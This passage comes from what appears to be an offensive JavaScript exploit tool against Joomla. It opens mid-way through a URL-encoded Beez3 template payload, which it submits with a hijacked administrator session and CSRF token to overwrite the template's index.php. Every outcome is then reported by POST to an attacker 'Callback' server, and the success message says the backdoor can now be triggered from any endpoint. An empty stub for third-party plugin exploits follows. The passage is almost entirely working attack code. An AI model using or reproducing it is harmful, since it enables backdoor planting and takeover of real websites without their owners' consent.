9%09%09%09%09%3C%3Fphp+echo+htmlspecialchars%28%24templateparams-%3Eget%28%27sitetitle%27%29%29%3B+%3F%3E%0D%0A%09%09%09%09%09%09%3C%3Fphp+elseif+%28%21%24logo+AND+%24config-%3Eget%28%27sitename%27%29%29+%3A+%3F%3E%0D%0A%09%09%09%09%09%09%09%3C%3Fphp+echo+htmlspecialchars%28%24config-%3Eget%28%27sitename%27%29%29%3B+%3F%3E%0D%0A%09%09%09%09%09%09%3C%3Fphp+endif%3B+%3F%3E%0D%0A%09%09%09%09%09%09%3Cspan+class%3D%22header1%22%3E%0D%0A%09%09%09%09%09%09%3C%3Fphp+echo+htmlspecialchars%28%24templateparams-%3Eget%28%27sitedescription%27%29%29%3B+%3F%3E%0D%0A%09%09%09%09%09%09%3C%2Fspan%3E%3C%2Fh1%3E%0D%0A%09%09%09%09%09%3C%2Fdiv%3E%3C%21--+end+logoheader+--%3E%0D%0A%09%09%09%09%09%3Cul+class%3D%22skiplinks%22%3E%0D%0A%09%09%09%09%09%09%3Cli%3E%3Ca+href%3D%22%23main%22+class%3D%22u2%22%3E%3C%3Fphp+echo+JText%3A%3A_%28%27TPL_BEEZ3_SKIP_TO_CONTENT%27%29%3B+%3F%3E%3C%2Fa%3E%3C%2Fli%3E%0D%0A%09%09%09%09%09%09%3Cli%3E%3Ca+href%3D%22%23nav%22+class%3D%22u2%22%3E%3C%3Fphp+echo+JText%3A%3A_%28%27TPL_BEEZ3_JUMP_TO_NAV%27%29%3B+%3F%3E%3C%2Fa%3E%3C%2Fli%3E%0D%0A%09%09%09%09%09%09%3C%3Fphp+if+%28%24showRightColumn%29+%3A+%3F%3E%0D%0A%09%09%09%09%09%09%09%3Cli%3E%3Ca+href%3D%22%23right%22+class%3D%22u2%22%3E%3C%3Fphp+echo+JText%3A%3A_%28%27TPL_BEEZ3_JUMP_TO_INFO%27%29%3B+%3F%3E%3C%2Fa%3E%3C%2Fli%3E%0D%0A%09%09%09%09%09%09%3C%3Fphp+endif%3B+%3F%3E%0D%0A%09%09%09%09%09%3C%2Ful%3E%0D%0A%09%09%09%09%09%3Ch2+class%3D%22unseen%22%3E%3C%3Fphp+echo+JText%3A%3A_%28%27TPL_BEEZ3_NAV_VIEW_SEARCH%27%29%3B+%3F%3E%3C%2Fh2%3E%0D%0A%09%09%09%09%09%3Ch3+class%3D%22unseen%22%3E%3C%3Fphp+echo+JText%3A%3A_%28%27TPL_BEEZ3_NAVIGATION%27%29%3B+%3F%3E%3C%2Fh3%3E%0D%0A%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-1%22+%2F%3E%0D%0A%09%09%09%09%09%3Cdiv+id%3D%22line%22%3E%0D%0A%09%09%09%09%09%09%3Cdiv+id%3D%22fontsize%22%3E%3C%2Fdiv%3E%0D%0A%09%09%09%09%09%09%3Ch3+class%3D%22unseen%22%3E%3C%3Fphp+echo+JText%3A%3A_%28%27TPL_BEEZ3_SEARCH%27%29%3B+%3F%3E%3C%2Fh3%3E%0D%0A%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-0%22+%2F%3E%0D%0A%09%09%09%09%09%3C%2Fdiv%3E+%3C%21--+end+line+--%3E%0D%0A%09%09%09%09%3C%2Fheader%3E%3C%21--+end+header+--%3E%0D%0A%09%09%09%09%3Cdiv+id%3D%22%3C%3Fphp+echo+%24showRightColumn+%3F+%27contentarea2%27+%3A+%27contentarea%27%3B+%3F%3E%22%3E%0D%0A%09%09%09%09%09%3Cdiv+id%3D%22breadcrumbs%22%3E%0D%0A%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-2%22+%2F%3E%0D%0A%09%09%09%09%09%3C%2Fdiv%3E%0D%0A%0D%0A%09%09%09%09%09%3C%3Fphp+if+%28%24navposition+%3D%3D+%27left%27+and+%24showleft%29+%3A+%3F%3E%0D%0A%09%09%09%09%09%09%3Cnav+class%3D%22left1+%3C%3Fphp+if+%28%24showRightColumn+%3D%3D+null%29+%7B+echo+%27leftbigger%27%3B%7D+%3F%3E%22+id%3D%22nav%22%3E%0D%0A%09%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-7%22+style%3D%22beezDivision%22+headerLevel%3D%223%22+%2F%3E%0D%0A%09%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-4%22+style%3D%22beezHide%22+headerLevel%3D%223%22+state%3D%220+%22+%2F%3E%0D%0A%09%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-5%22+style%3D%22beezTabs%22+headerLevel%3D%222%22++id%3D%223%22+%2F%3E%0D%0A%09%09%09%09%09%09%3C%2Fnav%3E%3C%21--+end+navi+--%3E%0D%0A%09%09%09%09%09%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A%09%09%09%09%09%3Cdiv+id%3D%22%3C%3Fphp+echo+%24showRightColumn+%3F+%27wrapper%27+%3A+%27wrapper2%27%3B+%3F%3E%22+%3C%3Fphp+if+%28isset%28%24showno%29%29%7Becho+%27class%3D%22shownocolumns%22%27%3B%7D%3F%3E%3E%0D%0A%09%09%09%09%09%09%3Cdiv+id%3D%22main%22%3E%0D%0A%0D%0A%09%09%09%09%09%09%09%3C%3Fphp+if+%28%24this-%3EcountModules%28%27position-12%27%29%29+%3A+%3F%3E%0D%0A%09%09%09%09%09%09%09%09%3Cdiv+id%3D%22top%22%3E%0D%0A%09%09%09%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-12%22+%2F%3E%0D%0A%09%09%09%09%09%09%09%09%3C%2Fdiv%3E%0D%0A%09%09%09%09%09%09%09%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A%09%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22message%22+%2F%3E%0D%0A%09%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22component%22+%2F%3E%0D%0A%0D%0A%09%09%09%09%09%09%3C%2Fdiv%3E%3C%21--+end+main+--%3E%0D%0A%09%09%09%09%09%3C%2Fdiv%3E%3C%21--+end+wrapper+--%3E%0D%0A%0D%0A%09%09%09%09%09%3C%3Fphp+if+%28%24showRightColumn%29+%3A+%3F%3E%0D%0A%09%09%09%09%09%09%3Cdiv+id%3D%22close%22%3E%0D%0A%09%09%09%09%09%09%09%3Ca+href%3D%22%23%22+onclick%3D%22auf%28%27right%27%29%22%3E%0D%0A%09%09%09%09%09%09%09%3Cspan+id%3D%22bild%22%3E%0D%0A%09%09%09%09%09%09%09%09%3C%3Fphp+echo+JText%3A%3A_%28%27TPL_BEEZ3_TEXTRIGHTCLOSE%27%29%3B+%3F%3E%0D%0A%09%09%09%09%09%09%09%3C%2Fspan%3E%0D%0A%09%09%09%09%09%09%09%3C%2Fa%3E%0D%0A%09%09%09%09%09%09%3C%2Fdiv%3E%0D%0A%0D%0A%09%09%09%09%09%09%3Caside+id%3D%22right%22%3E%0D%0A%09%09%09%09%09%09%09%3Ch2+class%3D%22unseen%22%3E%3C%3Fphp+echo+JText%3A%3A_%28%27TPL_BEEZ3_ADDITIONAL_INFORMATION%27%29%3B+%3F%3E%3C%2Fh2%3E%0D%0A%09%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-6%22+style%3D%22beezDivision%22+headerLevel%3D%223%22+%2F%3E%0D%0A%09%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-8%22+style%3D%22beezDivision%22+headerLevel%3D%223%22+%2F%3E%0D%0A%09%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-3%22+style%3D%22beezDivision%22+headerLevel%3D%223%22+%2F%3E%0D%0A%09%09%09%09%09%09%3C%2Faside%3E%3C%21--+end+right+--%3E%0D%0A%09%09%09%09%09%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A%09%09%09%09%09%3C%3Fphp+if+%28%24navposition+%3D%3D+%27center%27+and+%24showleft%29+%3A+%3F%3E%0D%0A%09%09%09%09%09%09%3Cnav+class%3D%22left+%3C%3Fphp+if+%28%24showRightColumn+%3D%3D+null%29+%7B+echo+%27leftbigger%27%3B+%7D+%3F%3E%22+id%3D%22nav%22+%3E%0D%0A%0D%0A%09%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-7%22++style%3D%22beezDivision%22+headerLevel%3D%223%22+%2F%3E%0D%0A%09%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-4%22+style%3D%22beezHide%22+headerLevel%3D%223%22+state%3D%220+%22+%2F%3E%0D%0A%09%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-5%22+style%3D%22beezTabs%22+headerLevel%3D%222%22++id%3D%223%22+%2F%3E%0D%0A%0D%0A%09%09%09%09%09%09%3C%2Fnav%3E%3C%21--+end+navi+--%3E%0D%0A%09%09%09%09%09%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A%09%09%09%09%09%3Cdiv+class%3D%22wrap%22%3E%3C%2Fdiv%3E%0D%0A%09%09%09%09%3C%2Fdiv%3E+%3C%21--+end+contentarea+--%3E%0D%0A%09%09%09%3C%2Fdiv%3E%3C%21--+back+--%3E%0D%0A%09%09%3C%2Fdiv%3E%3C%21--+all+--%3E%0D%0A%0D%0A%09%09%3Cdiv+id%3D%22footer-outer%22%3E%0D%0A%09%09%09%3C%3Fphp+if+%28%24showbottom%29+%3A+%3F%3E%0D%0A%09%09%09%09%3Cdiv+id%3D%22footer-inner%22+%3E%0D%0A%0D%0A%09%09%09%09%09%3Cdiv+id%3D%22bottom%22%3E%0D%0A%09%09%09%09%09%09%3Cdiv+class%3D%22box+box1%22%3E+%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-9%22+style%3D%22beezDivision%22+headerlevel%3D%223%22+%2F%3E%3C%2Fdiv%3E%0D%0A%09%09%09%09%09%09%3Cdiv+class%3D%22box+box2%22%3E+%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-10%22+style%3D%22beezDivision%22+headerlevel%3D%223%22+%2F%3E%3C%2Fdiv%3E%0D%0A%09%09%09%09%09%09%3Cdiv+class%3D%22box+box3%22%3E+%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-11%22+style%3D%22beezDivision%22+headerlevel%3D%223%22+%2F%3E%3C%2Fdiv%3E%0D%0A%09%09%09%09%09%3C%2Fdiv%3E%0D%0A%0D%0A%09%09%09%09%3C%2Fdiv%3E%0D%0A%09%09%09%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A%09%09%09%3Cdiv+id%3D%22footer-sub%22%3E%0D%0A%09%09%09%09%3Cfooter+id%3D%22footer%22%3E%0D%0A%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-14%22+%2F%3E%0D%0A%09%09%09%09%3C%2Ffooter%3E%3C%21--+end+footer+--%3E%0D%0A%09%09%09%3C%2Fdiv%3E%0D%0A%09%09%3C%2Fdiv%3E%0D%0A%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22debug%22+%2F%3E%0D%0A%09%3C%2Fbody%3E%0D%0A%3C%2Fhtml%3E%0D%0A" +
                    "&task=template.save&" +
                    csrf_token + "=1&jform%5Bextension_id%5D=" +
                    ID + "&jform%5Bfilename%5D=%2Findex.php"

                );

                // Check if the file was edited successfully
                if (_stage2.responseText.match("File successfully saved.")) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + templateURI,
                                    "Message": "(Stage 2) - (Beez3) Template Edited Sucessfuly! <file: index.php>",
                                    "Module": "JLEditTemplates.Beez3()",
                                    "About": "You can trigger your backdoor in any application file/endpoint",
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + templateURI,
                                    "Message": "ERROR: (Stage 2) - Cannot Edit (Beez3) Template",
                                    "Module": "JLEditTemplates.Beez3()",
                                    "About": "The user doesn't have (Super Users) Permission",
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                }

            }

        } else {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "administrator/index.php?option=com_templates&view=templates&client_id=0",
                            "Module": "JLEditTemplates.Beez3()",
                            "Message": "ERROR: Stage 1 - (Cannot Get Server Response!)",
                            "Date": new Date().toUTCString()
                        }
                    )
                );
            }
        }

    }

}

function CustomExploits() {

    /* ########################################################################################################### */
    // #   This CustomExploit function will contain exploits for vulnerabilities in third-party plugins   # //
    /* ########################################################################################################### */

}
